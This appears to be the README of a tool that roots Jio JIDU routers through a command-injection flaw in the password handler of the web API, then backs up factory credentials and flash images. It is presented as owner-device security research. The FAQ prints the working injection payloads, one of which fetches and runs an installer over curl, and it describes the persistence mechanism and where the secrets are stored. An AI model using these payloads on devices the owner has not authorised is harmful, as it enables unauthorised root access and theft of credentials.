> ## Legal notice and disclaimer
>
> **Read this before you do anything.**
>
> - This software is provided **"as is", without warranty of any kind**, express
>   or implied. It may fail, behave unexpectedly, or leave your device in a
>   state you did not want.
> - **You use it entirely at your own risk, and on your own responsibility.**
>   To the fullest extent permitted by law, the authors and contributors accept
>   no liability for any damage, data loss, device failure, service
>   interruption, legal consequence, or breach of any agreement arising from
>   this project or its use.
> - **Compliance is your job.** Make sure what you do is lawful where you live
>   and allowed by any agreement that applies to you — these units are normally
>   carrier-supplied, and changing one can breach your service terms or void a
>   warranty.
> - **Only use it on hardware you own**, or hardware you have explicit written
>   permission to test. Using it against equipment you do not own or control may
>   be unlawful.
> - **No vendor code, no secrets, no infringement.** This is an independent,
>   clean-room security research project, built only from the publicly
>   observable behaviour of hardware the author owns. It contains no
>   manufacturer's or carrier's code, firmware, documentation, or confidential
>   information, and it is not derived from any of them.
> - **No affiliation.** This project is not connected to, endorsed by, or
>   supported by any manufacturer, carrier, or vendor. Product and company
>   names are used only to describe what the tool works with, and all
>   trademarks belong to their owners.
> - **Rights-holder requests are welcome.** If you hold rights in something you
>   believe this project touches, say so via this repository's issues and it
>   will be dealt with promptly — including removal of anything that should not
>   be here.
> - **No support, and no promised outcome.** It is shared for security research
>   and personal use.
>
> By downloading, running, or otherwise using any part of this project, you
> accept these terms. If you do not accept them, do not use it.

---

# idu-unlock — Root SSH + Full Backup for Jio JIDU Routers

**idu-unlock gives you permanent root SSH access to your JIDU router and saves a complete backup of it — safely, using the router's own web interface.**

It performs two tasks:

1. **Unlock** — installs a persistent `root` SSH key, so you retain administrative access even after a reboot.
2. **Backup** — saves factory credentials (u-boot, web, Wi-Fi) and a full image of every flash partition.

What it does **not** do: write firmware, install OpenWrt, or modify the router's operating system. Those steps are intentionally out of scope. Once you have root access and a backup, the optional manual OpenWrt procedure is documented in [OPENWRT.md](OPENWRT.md).

How the project is organised:

```
flash.sh     Launcher for macOS and Linux
flash.ps1    Launcher for Windows (PowerShell) — same commands, same behaviour
idu.py       Core engine used by both launchers (use directly for scripting)
```

> **Windows users:** you are fully supported. Every `./flash.sh` command in this guide has a `.\flash.ps1` equivalent. See [Windows setup](#windows-setup) for one-time prerequisites.

## Contents

- [Command reference](#command-reference)
- [Supported models](#supported-models)
- [Prerequisites](#prerequisites)
- [Quick start](#quick-start)
- [Download](#download)
- [Unlock and backup — step by step](#unlock-and-backup--step-by-step)
- [Windows setup](#windows-setup)
- [FAQ](#faq)
- [Glossary](#glossary)
- [What is next — OpenWrt](#what-is-next--openwrt)
- [License](#licence)
- [Credits and provenance](#provenance)

## Command reference

| Command | Purpose | Modifies the router? |
| --- | --- | --- |
| `./flash.sh check` | Is this unit unlockable? | No — read-only |
| `./flash.sh detect` | Identify model and family | No — read-only |
| `./flash.sh backup` | Unlock, then save credentials + full flash image | Yes — installs SSH key, then reads |
| `./flash.sh unlock` | Install persistent root SSH | Yes — installs SSH key |
| `./flash.sh` | Verify → unlock → backup, with prompts | Yes — installs SSH key |

On Windows, use `.\flash.ps1` in place of `./flash.sh`.

Common options (all commands):

- `--router URL` (default `https://192.168.31.1`)
- `--password PW` (if omitted, you are prompted securely)
- `--key PATH` (default `~/.ssh/idu_rsa`)

In PowerShell, single-dash forms (`-Router`, `-Password`, `-Key`) also work.

## Supported models

| Family | Models | Result |
| --- | --- | --- |
| MediaTek 6j01 | JIDU 6101 / 6201 / 6401 / 6601 / **6701** | root SSH + full backup |
| Qualcomm 6j11 | JIDU 6111 / 6411 / 6611 / 6811 / 6911 | root SSH + full backup |

Unsure whether your unit qualifies? Run the read-only compatibility check — it changes nothing:

```sh
./flash.sh check        # macOS / Linux
.\flash.ps1 check       # Windows
```

Firmware matters:

- `R2.0.19.5` and earlier — unlockable.
- `R3.2.3` and newer — the vendor closed the vulnerability this tool relies on. The tool will report *not unlockable*, and there is no workaround in this repository.

Two conditions apply to all models:

- The router must be **fully set up** — setup wizard completed, admin password set. A factory-reset unit locks its web API until the wizard is finished.
- It must be hardware **you own** or have written permission to test. See the legal notice above.

## Prerequisites

- Router powered on, with your computer connected to the same network.
- Router **admin password** — the password you use to log in to the router's web page.
- A computer running **macOS, Linux, or Windows** with **Python 3**:
  - macOS: provided by `xcode-select --install`
  - Linux: install via your package manager, for example `sudo apt install python3`
  - Windows: `winget install Python.Python.3.12` (tick *Add python.exe to PATH* if offered)
- The launcher installs remaining Python dependencies automatically into a local `.venv/` folder on first run.
- Linux only: `expect` (`sudo apt install expect` or equivalent). macOS includes it. It is used to enter SSH passwords when required.
- Windows only: **OpenSSH Client**. Windows 10/11 usually include it — verify with `ssh -V`. See [Windows setup](#windows-setup) if it is missing.

## Quick start

```sh
./flash.sh check      # read-only: is this unit unlockable?
./flash.sh backup     # unlock (persistent root SSH) + full backup
ssh -i ~/.ssh/idu_rsa root@192.168.31.1
```

On Windows:

```powershell
.\flash.ps1 check
.\flash.ps1 backup
```

Running `./flash.sh` with no arguments performs the full sequence (verify → unlock → backup) with prompts.

## Download

```sh
git clone https://github.com/wpfyorg/idu-unlock.git
cd idu-unlock
```

Or without git: download the ZIP from [the repository page](https://github.com/wpfyorg/idu-unlock) (**Code** → **Download ZIP**), unpack it, and `cd` into the folder.

One-line shortcuts (download, unpack, enter):

```sh
curl -L https://github.com/wpfyorg/idu-unlock/archive/refs/heads/main.tar.gz | tar xz && cd idu-unlock-main && chmod +x flash.sh idu.py
```

```powershell
Invoke-WebRequest https://github.com/wpfyorg/idu-unlock/archive/refs/heads/main.zip -OutFile idu-unlock.zip; Expand-Archive idu-unlock.zip -DestinationPath .; cd idu-unlock-main
```

ZIP downloads lose the executable bit — if `./flash.sh` says *permission denied*, run `chmod +x flash.sh idu.py` once inside the folder.

## Unlock and backup — step by step

> On Windows, replace every `./flash.sh` below with `.\flash.ps1`. The steps are otherwise identical.

**Step 0 — Prepare.**

- Log out of the router's web page. The router permits only **one admin login at a time**.
- Open a terminal inside the project folder.

**Step 1 — Identify the router (safe, read-only).**

```sh
./flash.sh detect
```

Example output: `[+] JIDU6701 · ... · family: mediatek`. Nothing is modified. If this fails, see [FAQ](#faq).

> The router temporarily blocks logins after approximately five incorrect passwords. If it rejects yours, verify the password rather than retrying repeatedly.

**Step 2 — Back up (do not skip).**

```sh
./flash.sh backup
```

This installs the root SSH key, then saves factory passwords and a complete flash image into a folder named after the router's Wi-Fi network. **Treat that folder as a set of keys** — do not share it or upload it to GitHub.

**Step 3 — Connect.**

```sh
ssh -i ~/.ssh/idu_rsa root@192.168.31.1
```

The unlock installs a startup script on the router so SSH survives reboots. `./flash.sh unlock` performs only this step and prints the exact `ssh` command for your router's address at the end.

## Windows setup

Use **`flash.ps1`** — `flash.sh` is a bash script and will not run natively.

**One-time setup**

1. **Python 3** — `winget install Python.Python.3.12`. Tick *Add python.exe to PATH* if the installer offers it, then reopen PowerShell.
2. **OpenSSH Client** — check with `ssh -V`. If unrecognised, open PowerShell **as administrator** and run:
   ```powershell
   Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
   ```

**Running the tool**

```powershell
.\flash.ps1 check      # read-only compatibility check
.\flash.ps1 backup     # unlock + backup
```

The leading `.\` is required — PowerShell does not run scripts from the current folder by name alone. If it reports *running scripts is disabled on this system*, permit scripts for the current window only and retry:

```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
```

This expires when the window closes and changes nothing permanently.

**Firewall and port 80.** To unlock, the tool starts a small web server on your PC that the *router* downloads the installer from. On first unlock, Windows Firewall will ask for permission — click **Allow** for **Private** networks (your home network; *Public* is for cafés and similar).

If an unlock ends with *the router did not call back*, allow `python.exe` through the firewall, or run PowerShell as administrator so the rule can be created. If another program already occupies port 80 (IIS and the *World Wide Web Publishing Service* are common), check with:

```powershell
netstat -ano | findstr :80
```

A reboot clears a stuck holder. Alternatively, `flash.sh` runs unchanged under **WSL** or **Git Bash**.

## FAQ

<details>
<summary><strong>Another admin session is already open</strong></summary>

Log out of the router's web page (or reboot the router) and retry. One admin session at a time is a hard limit.

</details>

<details>
<summary><strong>The router is factory-reset</strong></summary>

Complete the setup wizard in a browser first, then return.

</details>

<details>
<summary><strong>Wrong password / logins blocked</strong></summary>

The router locks out after ~5 failures. Wait, then double-check the password.

</details>

<details>
<summary><strong>check reports not unlockable</strong></summary>

The unit runs `R3.x` firmware. There is no unlock path for it in this repository.

</details>

<details>
<summary><strong>The router did not call back / nothing arrives at the callback</strong></summary>

Your computer's firewall is likely blocking the router. Your machine must be reachable on port 80 and on the router's subnet. On Windows, allow `python.exe` or run PowerShell as administrator.

</details>

<details>
<summary><strong>Permission denied running ./flash.sh</strong></summary>

ZIP downloads drop the executable bit. Run `chmod +x flash.sh idu.py` once.

</details>

<details>
<summary><strong>Windows: running scripts is disabled</strong></summary>

Run `Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass` for the current window.

</details>

<details>
<summary><strong>Windows: ssh is not recognized / ssh is not installed, or not on PATH</strong></summary>

Install the OpenSSH Client — see [Windows setup](#windows-setup).

</details>

<details>
<summary><strong>SSH refused after a reboot</strong></summary>

The unlock did not fully apply. Run `./flash.sh unlock` again.

</details>

<details>
<summary><strong>Backup folder is very large</strong></summary>

Expected. Every partition is imaged; `mtd5` and `mtd6` alone are approximately 140 MB and 90 MB. `--full-chip` adds more.

</details>

<details>
<summary><strong>How does the unlock work?</strong></summary>

`/WCGI`, the router's JSON-RPC endpoint, includes a password handler that builds a shell command containing your password — unescaped. A password containing `$( ... )` is therefore *executed* as root. The firmware's password rules are the constraint: 8–32 characters, no `|`, but `$`, `(`, `)`, `{`, `}`, and `${IFS}` are accepted. The installer is therefore delivered in two steps, each within the 32-character limit:

```sh
Aa1$(curl${IFS}192.168.31.51>/a)   # 32 chars — fetch the installer
Aa1$(sh${IFS}/a)                   # 16 chars — run it
```

The `Aa1` prefix is randomised on each run because the router remembers the last three passwords per account. (`/a` is the shortest writable absolute path, which limits the download address to 13 characters.)

Persistence requires more than a key: the vendor's dropbear startup script disables SSH on every boot, and this firmware has no `/etc/init.d/rc.local`. The installer therefore adds its own startup script (`/etc/init.d/idu-ssh`, `START=99`) that starts SSH regardless. Note that the stock dropbear rejects ed25519 keys, so the tool generates an RSA key for you.

Factory secret locations — relevant because the backup collects them:

- U-boot console credentials are **not** in the u-boot environment. They are stored as plain `KEY=VALUE` text in the **MFG partition (`/dev/mtd7`)**, alongside the Wi-Fi PSK and web password.
- The partition named `u-boot-env` (`mtd2`) is **empty**. The real environment is in the UBI volume **`/dev/ubi0_0`** (inside mtd5), per `/etc/fw_env.config`. A second vendor-specific environment is in **mtd8**.

</details>

<details>
<summary><strong>What is in a backup?</strong></summary>

```
AirFiber-XXXXXX/
├── credentials.txt        u-boot + web + Wi-Fi + ACS + serial + MAC
├── uboot_credentials.env  UBOOT_USERNAME=… / UBOOT_PASSWORD=…
├── partitions.txt         cat /proc/mtd
├── uboot_env.txt          fw_printenv, both environments
├── factory_env.txt        the raw MFG key=value block
└── backup/mtdN_NAME.bin   every partition (mtd5/mtd6 are ~140/90 MB)
```

Restoring a single partition (only if you understand the implications):

```sh
scp backup/mtd1_BL2.bin root@192.168.31.1:/tmp/
ssh root@192.168.31.1 'mtd write /tmp/mtd1_BL2.bin BL2'
```

</details>

## Glossary

| Term | Meaning |
| --- | --- |
| **SSH** | Secure remote terminal — how you log in to and control the router from your computer. |
| **root** | The all-powerful administrator account on a Linux system. |
| **Firmware** | The operating system stored inside the router. |
| **Partition** | A named section of the flash chip (the MFG partition holds factory passwords). |
| **u-boot** | The small bootloader that starts the router before the main OS loads. |
| **UART** | A serial port on the circuit board, used when software access is not enough. |
| **`/WCGI`** | The router's internal web API — what its admin web page communicates with. |

## What is next — OpenWrt

This tool stops at root access and a backup by design — it never writes firmware.

To install OpenWrt afterwards, follow the slow, step-by-step manual procedure in [**OPENWRT.md**](OPENWRT.md), with prebuilt images in the [**firmware download folder**](https://drive.google.com/drive/folders/16OvJoZeZFTx4dXRZWfGMlsy-RXDB54_h). Read that document fully before starting: replacing the operating system carries brick risk, and your backup is the only way back.

## Licence

**Noncommercial only.** You may use, modify, and share this project for noncommercial purposes — but not sell it, resell it, or ship it inside a commercial product or service. If you publish a video, stream, or tutorial featuring this project, credit it and link back to this repository.

Full terms are in [LICENSE](LICENSE) — PolyForm Noncommercial 1.0.0 with the attribution condition above. That makes this project *source-available*, not open source in the OSI sense. Commercial rights are not granted; contact the maintainers if you need different terms.

## Provenance

Clean-room implementation: the protocol flow is the device's own public API, and the code shares nothing substantive with any existing proof of concept (the only overlaps are standard Python/HTTP idioms such as the `application/json` header).

An earlier version of this project also automated the community two-stage OpenWrt install; that automation is not part of this tool, and nothing here writes firmware. The procedure is documented in [the-diy-daddy/6j01_6j11](https://github.com/the-diy-daddy/6j01_6j11) — credit for working it out belongs there. It is also written out for manual entry in [OPENWRT.md](OPENWRT.md). That repository ships no licence, and neither did the proof of concept this work started from, so neither is redistributed here.
